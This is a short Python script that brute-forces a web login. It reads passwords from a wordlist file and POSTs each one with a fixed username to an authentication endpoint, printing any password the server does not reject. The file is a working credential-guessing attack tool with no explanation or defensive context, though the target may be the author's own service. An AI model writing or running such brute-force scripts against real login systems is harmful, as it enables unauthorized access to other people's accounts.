import requests
from workpool import WorkerPool
wp = WorkerPool(2)

@wp.run_async
def make_attempt(username, password, success):
    data = {
        "username": username,
        "password": password
    }
    r = requests.post("http://api.quinnftw.com:3000/auth", data)
    if r.text != "invalid login":
        print "password found!"
        print password
        success()

def passwords():
    pws = open("passwords.txt").readlines()
    for p in pws:
        yield p.strip()

def main():
    def success():
        wp.done = True
    for i in passwords():
        make_attempt("quinn", i, success)

if __name__ == "__main__":
    main()
